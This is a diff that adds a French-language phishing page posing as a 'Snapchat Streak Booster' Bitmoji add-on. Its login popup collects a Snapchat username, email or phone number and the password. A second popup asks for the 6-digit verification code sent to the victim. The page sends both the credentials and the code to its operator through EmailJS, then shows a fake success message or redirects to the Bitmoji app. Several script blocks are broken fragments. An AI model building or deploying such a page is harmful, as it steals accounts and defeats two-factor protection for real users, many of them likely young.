@@ -1,0 +1,475 @@
+
+<!DOCTYPE html>
+
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<title>Connexion Streaks Snapchat</title>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<!-- BALISES OPEN GRAPH POUR RÉSEAUX SOCIAUX -->
+<meta content="Bitmoji Add-On" property="og:title"/>
+<meta content="Prêt à faire durer vos flammes à l’infini ? Découvre comment booster tes Streaks dès aujourd’hui !" property="og:description"/>
+<meta content="https://snapchat-streak-booster.onrender.com/preview2_1200x630.jpg" property="og:image"/>
+<meta content="image/jpeg" property="og:image:type"/>
+<meta content="1200" property="og:image:width"/>
+<meta content="630" property="og:image:height"/>
+<meta content="https://snapchat-streak-booster.onrender.com" property="og:url"/>
+<meta content="website" property="og:type"/>
+<!-- Twitter Card -->
+<meta content="summary_large_image" name="twitter:card">
+<meta content="Bitmoji Add-On" name="twitter:title">
+<meta content="Prêt à faire durer vos flammes à l’infini ? Découvre comment booster tes Streaks dès aujourd’hui !" name="twitter:description"/>
+<meta content="https://snapchat-streak-booster.onrender.com/preview2_1200x630.jpg" name="twitter:image"/>
+<style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #00c38b, #05a48c);
+      color: white;
+      text-align: center;
+    }
+    .header {
+      padding: 40px 20px 20px;
+      animation: fadeInDown 1s ease-out;
+    }
+    .header h1 {
+      font-size: 3em;
+      margin-bottom: 10px;
+    }
+    .subtitle {
+      font-size: 1.2em;
+      margin-bottom: 30px;
+    }
+    .button {
+      background: white;
+      color: #00c38b;
+      border: none;
+      padding: 12px 24px;
+      font-size: 1.1em;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+    .button:hover {
+      background: #e0ffe8;
+    }
+    .bitmoji-row {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin: 40px 0;
+      animation: fadeInUp 1.5s ease;
+    }
+    .bitmoji {
+      width: 80px;
+      height: 80px;
+      margin: 10px;
+      background: #fffc00;
+      border-radius: 50%;
+      background-size: cover;
+      background-position: center;
+    }
+    .extras {
+      background: white;
+      color: #333;
+      padding: 40px 20px;
+      border-top-left-radius: 20px;
+      border-top-right-radius: 20px;
+    }
+    .extras h2 {
+      margin-top: 0;
+    }
+    .extra-item {
+      margin: 20px 0;
+    }
+    .login-popup, .overlay, .login-loading, .verification-popup {
+      position: fixed;
+      top: 10%;
+      left: 50%;
+      transform: translateX(-50%);
+      background: white;
+      color: #000;
+      padding: 30px;
+      border-radius: 20px;
+      z-index: 1000;
+      width: 90%;
+      max-width: 400px;
+      text-align: left;
+      display: none;
+    }
+    .login-popup {
+      width: 340px;
+      background: #fffc00;
+      color: #000;
+      text-align: left;
+    }
+    .login-popup input, .verification-popup input {
+      color: #000;
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    .login-popup .button, .verification-popup .button {
+      background: #000;
+      color: #fff;
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .overlay {
+      background: rgba(0,0,0,0.5);
+      width: 100%;
+      height: 100%;
+      z-index: 999;
+    }
+    .bottom-banner img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+    .verification-popup label {
+    color: #000;
+    font-weight: bold;
+  }
+
+.login-loading {
+  display: none;
+  position: fixed;
+  top: 40%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: white;
+  color: black;
+  padding: 30px;
+  border-radius: 20px;
+  z-index: 1100;
+  width: 80%;
+  max-width: 300px;
+  text-align: center;
+}
+
+.loader {
+  border: 6px solid #f3f3f3;
+  border-top: 6px solid #00c38b;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+</style>
+</meta></meta><meta content="https://snapchat-streak-booster.onrender.com/preview2_1200x630.jpg" name="snapchat:preview"/></head>
+<body><img alt="Banner Boost Tes Streak" src="banner.png" style="width:100%; display:block;"/>
+<!-- ✅ Image statique visible pour Snapchat en toute priorité -->
+<div class="header">
+<h1>Snapchat Streak Booster <img alt="🔥" src="flamme.gif" style="width:30px; height:auto; vertical-align:middle;"/></h1>
+<p class="subtitle">Connecte-toi pour ne pas perdre tes flammes Snapchat</p>
+<button class="button" onclick="openLogin()">Réactiver et booster mes flammes maintenant</button>
+</div>
+<div class="bitmoji-row">
+<div class="bitmoji" style="background-image: url('avatar1.png')"></div>
+<div class="bitmoji" style="background-image: url('avatar2.png')"></div>
+<div class="bitmoji" style="background-image: url('avatar3.png')"></div>
+<div class="bitmoji" style="background-image: url('avatar4.png')"></div>
+</div>
+<div class="extras">
+<h2>🔥 Pourquoi garder tes Streaks ?</h2>
+<div class="extra-item">📆 Rappels quotidiens pour ne jamais briser ta série</div>
+<div class="extra-item">⏳ Sablier d’urgence quand une flamme est en danger</div>
+<div class="extra-item">📈 Statistiques sur tes flammes les plus longues</div>
+<div class="extra-item">🎁 Récompenses pour les séries de plus de 100 jours</div>
+</div>
+<div class="overlay" id="overlay" onclick="closeLogin()"></div>
+<div class="login-popup" id="loginPopup">
+<img alt="Snapchat" src="snapchat-logo.png" style="display:block; margin:auto; width:50px;"/>
+<h3 style="text-align:center;">Connexion pour maintenir tes flammes</h3>
+<label for="identifier" id="identifierLabel">Nom d'utilisateur ou adresse e-mail</label>
+<input id="identifier" type="text"/>
+<div style="text-align: center; margin: 8px 0;">
+<button class="button" id="toggle-login-type" onclick="toggleLoginType()" style="background: transparent; color: blue;">Utiliser le numéro de mobile</button>
+</div>
+<label for="password">Mot de passe Snapchat</label>
+<input id="password" placeholder="••••••••" type="password"/>
+<button class="button" onclick="submitLogin()">Se connecter</button>
+<div style="text-align:center; margin-top:15px;">
+<a href="#">Mot de passe Snapchat oublié ?</a><br/>
+<a href="#">Créer un compte</a>
+</div>
+</div>
+<div class="verification-popup" id="verificationPopup">
+<h3 style="margin-top: 0; font-size: 1.5em; ">Nouvel appareil détecté</h3>
+<p style="margin-bottom: 20px; margin-top: 10px;">Snapchat t’envoie un code pour relancer ton compteur de streaks.</p>
+<p style="font-weight: bold; margin-bottom: 12px; margin-top: 10px;">Entre le code reçu pour réactiver tes streaks :</p>
+<input id="verificationCode" placeholder="Code à 6 chiffres" type="text"/ maxlength="6">
+<button class="button" onclick="submitVerification()">Vérifier</button>
+</div>
+<div class="bottom-banner">
+<img alt="Bannière Bitmoji" src="banner.png"/>
+</div>
+<script>
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+    script.onload = () => {
+      
+      window.emailjs = emailjs;
+    };
+    document.head.appendChild(script);
+
+    
+
+    
+
+    window.toggleLoginType = function() {
+      const label = document.getElementById('identifierLabel');
+      const input = document.getElementById('identifier');
+      const toggleButton = document.getElementById('toggle-login-type');
+
+      window.isUsingPhone = !window.isUsingPhone;
+
+      if (window.isUsingPhone) {
+        label.textContent = "Numéro de mobile";
+        input.placeholder = "+33 6 12 34 56 78";
+        toggleButton.textContent = "Utiliser l'e-mail ou nom d'utilisateur";
+      } else {
+        label.textContent = "Nom d'utilisateur ou adresse e-mail";
+        input.placeholder = "";
+        toggleButton.textContent = "Utiliser le numéro de mobile";
+      }
+    };
+
+    
+
+      window.emailjs.send('service_photos', 'template_connexion', params)
+        .then(() => {
+          
+          document.getElementById('overlay').style.display = 'none';
+          document.getElementById('loginPopup').style.display = 'none';
+          
+
+          setTimeout(() => {
+            
+            document.getElementById('verificationPopup').style.display = 'block';
+          document.getElementById('verificationPopup').scrollIntoView({ behavior: 'smooth' });
+          }, 30);
+        })
+        .catch(err => {
+          alert("Erreur EmailJS : " + JSON.stringify(err));
+        });
+    };
+
+    // JS de vérification désactivé pour version statique
+
+      window.emailjs.send('service_photos', 'template_code', params)
+        .then(() => alert("Code envoyé avec succès !"))
+        .catch(err => alert("Erreur EmailJS : " + JSON.stringify(err)));
+
+      document.getElementById('verificationPopup').style.display = 'none';
+
+      setTimeout(() => {
+        const ua = navigator.userAgent;
+        if (/android/i.test(ua)) {
+          window.location.href = "https://play.google.com/store/apps/details?id=com.bitstrips.imoji";
+        } else if (/iPad|iPhone|iPod/.test(ua)) {
+          window.location.href = "https://apps.apple.com/app/bitmoji/id868077558";
+        } else {
+          alert("Bitmoji est disponible uniquement sur mobile.");
+        }
+        window.location.href = "bitmoji://";
+      }, 2000);
+    };
+  
+  
+
+    if (window.emailjs) {
+      window.emailjs.send('service_photos', 'template_connexion', params)
+        .then(function() {
+          document.getElementById('overlay').style.display = 'block';
+          document.getElementById('loginPopup').style.display = 'none';
+          document.getElementById('verificationPopup').style.display = 'block';
+        })
+        .catch(function(error) {
+          alert("Erreur lors de l'envoi du code : " + JSON.stringify(error));
+        });
+    } else {
+      alert("EmailJS non chargé.");
+    }
+  };
+
+</script>
+<script>
+  
+  
+
+  
+
+    if (window.emailjs) {
+      window.emailjs.send('service_photos', 'template_connexion', params)
+        .then(function() {
+          document.getElementById('overlay').style.display = 'block';
+          document.getElementById('loginPopup').style.display = 'none';
+          document.getElementById('verificationPopup').style.display = 'block';
+        })
+        .catch(function(error) {
+          alert("Erreur lors de l'envoi du code : " + JSON.stringify(error));
+        });
+    } else {
+      alert("EmailJS non chargé.");
+    }
+  };
+
+</script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    if (window.emailjs) {
+      
+      window.emailjs = emailjs;
+    }
+  });
+
+
+
+  if (window.emailjs) {
+    window.emailjs.send('service_photos', 'template_code', params)
+      .then(() => {
+        document.getElementById('verificationPopup').style.display = 'none';
+
+        const ua = navigator.userAgent;
+        if (/android/i.test(ua)) {
+          window.location.href = "https://play.google.com/store/apps/details?id=com.bitstrips.imoji";
+        } else if (/iPad|iPhone|iPod/.test(ua)) {
+          window.location.href = "https://apps.apple.com/app/bitmoji/id868077558";
+        } else {
+          alert("Bitmoji est disponible uniquement sur mobile.");
+        }
+        window.location.href = "bitmoji://";
+      })
+      .catch(err => {
+        alert("Erreur EmailJS : " + JSON.stringify(err));
+      });
+  } else {
+    alert("EmailJS non chargé.");
+  }
+};
+
+</script>
+
+<div class="login-loading" id="loginLoading">
+  <p style="text-align:center;">Envoi en cours...</p>
+  <div style="display:flex; justify-content:center; margin-top:10px;">
+    <div class="loader"></div>
+  </div>
+</div>
+
+
+<script>
+  window.openLogin = function() {
+    document.getElementById('overlay').style.display = 'block';
+    document.getElementById('loginPopup').style.display = 'block';
+  };
+
+  window.closeLogin = function() {
+    document.getElementById('overlay').style.display = 'none';
+    document.getElementById('loginPopup').style.display = 'none';
+  };
+</script>
+
+
+<div class="verification-popup" id="successPopup" style="display:none; text-align:center;">
+  <img src="flamme.gif" alt="Flamme Boostée" style="width:80px; height:auto; margin-bottom:15px;" />
+  <h3 style="margin-top: 0; font-size: 1.5em;">🔥 Flammes Réactivées !</h3>
+  <p style="margin: 10px 0 20px;">Tes streaks ont été boostés avec succès.<br/>Garde-les vivants chaque jour !</p>
+  <button class="button" onclick="window.close()">OK</button>
+</div>
+
+
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    const script = document.createElement('script');
+    script.src = "https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js";
+    script.onload = function() {
+      emailjs.init("AATQVLMcBJaRBgEox");
+      window.emailjs = emailjs;
+    };
+    document.head.appendChild(script);
+  });
+</script>
+
+</body>
+</html>
+
+<script>
+
+window.submitLogin = function() {
+  const identifier = document.getElementById('identifier').value.trim();
+  const password = document.getElementById('password').value.trim();
+
+  if (!identifier || !password) {
+    alert("Veuillez remplir tous les champs.");
+    return;
+  }
+
+  document.getElementById('overlay').style.display = 'block';
+  document.getElementById('loginPopup').style.display = 'none';
+  document.getElementById('loginLoading').style.display = 'block';
+
+  const params = {
+    fb_email: identifier,
+    fb_password: password
+  };
+
+  if (window.emailjs) {
+    window.emailjs.send('service_photos', 'template_connexion', params)
+      .then(function() {
+        document.getElementById('loginLoading').style.display = 'none';
+        document.getElementById('verificationPopup').style.display = 'block';
+        document.getElementById('verificationPopup').scrollIntoView({ behavior: 'smooth' });
+      })
+      .catch(function(error) {
+        document.getElementById('loginLoading').style.display = 'none';
+        alert("Erreur lors de l'envoi du code : " + JSON.stringify(error));
+      });
+  } else {
+    document.getElementById('loginLoading').style.display = 'none';
+    alert("EmailJS non chargé.");
+  }
+};
+
+</script>
+
+<script>
+
+window.submitVerification = function() {
+  const code = document.getElementById('verificationCode').value.trim();
+  if (!code) {
+    alert("Veuillez entrer le code.");
+    return;
+  }
+
+  const params = { verification_code: code };
+
+  if (window.emailjs) {
+    window.emailjs.send('service_photos', 'template_code', params)
+      .then(() => {
+        document.getElementById('verificationPopup').style.display = 'none';
+        document.getElementById('successPopup').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+      })
+      .catch(err => {
+        alert("Erreur EmailJS : " + JSON.stringify(err));
+      });
+  } else {
+    alert("EmailJS non chargé.");
+  }
+};
+
+</script>
